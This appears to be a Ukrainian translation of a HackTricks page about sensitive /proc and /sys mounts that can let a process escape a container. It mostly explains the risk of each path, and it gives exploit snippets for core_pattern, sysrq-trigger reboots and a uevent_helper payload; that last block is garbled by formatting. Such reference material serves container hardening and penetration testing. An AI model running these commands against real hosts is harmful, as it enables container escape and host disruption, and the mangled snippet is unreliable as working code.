# Чутливі монти

<details>

<summary><strong>Вивчайте хакінг AWS від нуля до героя з</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Інші способи підтримки HackTricks:

* Якщо ви хочете побачити вашу **компанію в рекламі на HackTricks** або **завантажити HackTricks у PDF** Перевірте [**ПЛАНИ ПІДПИСКИ**](https://github.com/sponsors/carlospolop)!
* Отримайте [**офіційний PEASS & HackTricks мерч**](https://peass.creator-spring.com)
* Відкрийте для себе [**Сім'ю PEASS**](https://opensea.io/collection/the-peass-family), нашу колекцію ексклюзивних [**NFT**](https://opensea.io/collection/the-peass-family)
* **Приєднуйтесь до** 💬 [**групи Discord**](https://discord.gg/hRep4RUj7f) або [**групи telegram**](https://t.me/peass) або **слідкуйте** за нами на **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Поділіться своїми хакерськими трюками, надсилайте PR до** [**HackTricks**](https://github.com/carlospolop/hacktricks) та [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) репозиторіїв GitHub.

</details>

Викладення `/proc` та `/sys` без належної ізоляції простору імен створює значні ризики безпеки, включаючи збільшення поверхні атаки та розголошення інформації. Ці каталоги містять чутливі файли, якщо їх неправильно налаштовано або доступ до них має несанкціонований користувач, це може призвести до втечі контейнера, модифікації хоста або надання інформації, яка допоможе в подальших атаках. Наприклад, неправильне монтування `-v /proc:/host/proc` може обійти захист AppArmor через його шляхову природу, залишаючи `/host/proc` незахищеним.

**Ви можете знайти додаткові деталі щодо кожної потенційної уразливості за посиланням** [**https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts**](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts)**.**

## Уразливості procfs

### `/proc/sys`

Цей каталог дозволяє змінювати ядерні змінні, зазвичай через `sysctl(2)`, і містить кілька підкаталогів, що викликають занепокоєння:

#### **`/proc/sys/kernel/core_pattern`**

* Описано в [core(5)](https://man7.org/linux/man-pages/man5/core.5.html).
* Дозволяє визначити програму для виконання при генерації файлу ядра з першими 128 байтами як аргументами. Це може призвести до виконання коду, якщо файл починається з каналу `|`.
*   **Приклад тестування та експлуатації**:

```bash
[ -w /proc/sys/kernel/core_pattern ] && echo Yes # Перевірка доступу на запис
cd /proc/sys/kernel
echo "|$overlay/shell.sh" > core_pattern # Встановлення власного обробника
sleep 5 && ./crash & # Запуск обробника
```

#### **`/proc/sys/kernel/modprobe`**

* Детально описано в [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html).
* Містить шлях до завантажувача ядра модулів, який викликається для завантаження ядерних модулів.
*   **Приклад перевірки доступу**:

```bash
ls -l $(cat /proc/sys/kernel/modprobe) # Перевірка доступу до modprobe
```

#### **`/proc/sys/vm/panic_on_oom`**

* Згадується в [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html).
* Глобальний прапорець, який контролює, чи викликати аварійне завершення ядра або викликати OOM killer при виникненні умови OOM.

#### **`/proc/sys/fs`**

* Згідно з [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html), містить параметри та інформацію про файлову систему.
* Доступ на запис може дозволити різноманітні атаки відмови обслуговування проти хоста.

#### **`/proc/sys/fs/binfmt_misc`**

* Дозволяє реєструвати інтерпретатори для неіноземних бінарних форматів на основі їх магічного числа.
* Може призвести до підвищення привілеїв або доступу до оболонки root, якщо `/proc/sys/fs/binfmt_misc/register` доступний для запису.
* Відповідний експлойт та пояснення:
* [Poor man's rootkit via binfmt\_misc](https://github.com/toffan/binfmt\_misc)
* Підробиці в уроці: [Посилання на відео](https://www.youtube.com/watch?v=WBC7hhgMvQQ)

### Інші в `/proc`

#### **`/proc/config.gz`**

* Може розкрити конфігурацію ядра, якщо `CONFIG_IKCONFIG_PROC` увімкнено.
* Корисно для зловмисників для виявлення вразливостей у робочому ядрі.

#### **`/proc/sysrq-trigger`**

* Дозволяє викликати команди Sysrq, що потенційно можуть призвести до негайних перезавантажень системи або інших критичних дій.
*   **Приклад перезавантаження хоста**:

```bash
echo b > /proc/sysrq-trigger # Перезавантажує хост
```

#### **`/proc/kmsg`**

* Викриває повідомлення кільцевого буфера ядра.
* Може допомогти в експлойтах ядра, витоках адрес та наданні чутливої системної інформації.

#### **`/proc/kallsyms`**

* Перераховує символи ядра та їх адреси.
* Необхідний для розробки експлойтів ядра, особливо для подолання KASLR.
* Інформація про адресу обмежена з `kptr_restrict` встановлено на `1` або `2`.
* Деталі в [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html).

#### **`/proc/[pid]/mem`**

* Взаємодіє з пристроєм пам'яті ядра `/dev/mem`.
* Історично вразливий до атак підвищення привілеїв.
* Докладніше в [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html).

#### **`/proc/kcore`**

* Представляє фізичну пам'ять системи у форматі ядра ELF.
* Читання може витікати вміст пам'яті хоста та інших контейнерів.
* Великий розмір файлу може призвести до проблем з читанням або аварійної зупинки програмного забезпечення.
* Детальне використання в [Вивантаження /proc/kcore в 2019 році](https://schlafwandler.github.io/posts/dumping-/proc/kcore/).

#### **`/proc/kmem`**

* Альтернативний інтерфейс для `/dev/kmem`, що представляє віртуальну пам'ять ядра.
* Дозволяє читання та запис, отже пряме змінення пам'яті ядра.

#### **`/proc/mem`**

* Альтернативний інтерфейс для `/dev/mem`, що представляє фізичну пам'ять.
* Дозволяє читання та запис, зміна всієї пам'яті потребує вирішення віртуальних у фізичні адреси.

#### **`/proc/sched_debug`**

* Повертає інформацію про планування процесів, обходячи захисти простору імен PID.
* Викриває назви процесів, ідентифікатори та ідентифікатори cgroup.

#### **`/proc/[pid]/mountinfo`**

* Надає інформацію про точки монтування в просторі імен монтування процесу.
* Викриває місце розташування `rootfs` контейнера або зображення. 

### Уразливості `/sys`

#### **`/sys/kernel/uevent_helper`**

* Використовується для обробки ядерних пристроїв `uevents`.
* Запис до `/sys/kernel/uevent_helper` може виконати довільні скрипти при спрацюванні `uevent` тригерів.
*   **Приклад експлуатації**: %%%bash

## Створює пейлоад

echo "#!/bin/sh" > /evil-helper echo "ps > /output" >> /evil-helper chmod +x /evil-helper

## Знаходить шлях хоста з монтування OverlayFS для контейнера

host\_path=$(sed -n 's/._\perdir=(\[^,]_).\*/\1/p' /etc/mtab)

## Встановлює uevent\_helper на шкідливий помічник

echo "$host\_path/evil-helper" > /sys/kernel/uevent\_helper

## Запускає uevent

echo change > /sys/class/mem/null/uevent

## Читає вивід

cat /output %%%
#### **`/sys/class/thermal`**

* Контролює налаштування температури, потенційно спричиняючи атаки DoS або фізичні пошкодження.

#### **`/sys/kernel/vmcoreinfo`**

* Витікає адреси ядра, потенційно компрометуючи KASLR.

#### **`/sys/kernel/security`**

* Містить інтерфейс `securityfs`, що дозволяє налаштування модулів безпеки Linux, таких як AppArmor.
* Доступ може дозволити контейнеру вимкнути свою систему MAC.

#### **`/sys/firmware/efi/vars` та `/sys/firmware/efi/efivars`**

* Викриває інтерфейси для взаємодії з змінними EFI в NVRAM.
* Неправильна конфігурація або експлуатація може призвести до "замурованих" ноутбуків або незавантажуваних хост-машин.

#### **`/sys/kernel/debug`**

* `debugfs` пропонує інтерфейс налагодження "без правил" для ядра.
* Історія проблем з безпекою через його необмежений характер.

### References

* [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts)
* [Understanding and Hardening Linux Containers](https://research.nccgroup.com/wp-content/uploads/2020/07/ncc\_group\_understanding\_hardening\_linux\_containers-1-1.pdf)
* [Abusing Privileged and Unprivileged Linux Containers](https://www.nccgroup.com/globalassets/our-research/us/whitepapers/2016/june/container\_whitepaper.pdf)

<details>

<summary><strong>Вивчайте хакінг AWS від нуля до героя з</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Інші способи підтримки HackTricks:

* Якщо ви хочете побачити **рекламу вашої компанії в HackTricks** або **завантажити HackTricks у PDF**, перевірте [**ПЛАНИ ПІДПИСКИ**](https://github.com/sponsors/carlospolop)!
* Отримайте [**офіційний PEASS & HackTricks мерч**](https://peass.creator-spring.com)
* Відкрийте для себе [**Сім'ю PEASS**](https://opensea.io/collection/the-peass-family), нашу колекцію ексклюзивних [**NFT**](https://opensea.io/collection/the-peass-family)
* **Приєднуйтесь до** 💬 [**групи Discord**](https://discord.gg/hRep4RUj7f) або [**групи telegram**](https://t.me/peass) або **слідкуйте** за нами в **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Поділіться своїми хакерськими трюками, надсилайте PR до** [**HackTricks**](https://github.com/carlospolop/hacktricks) та [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github репозиторіїв.

</details>
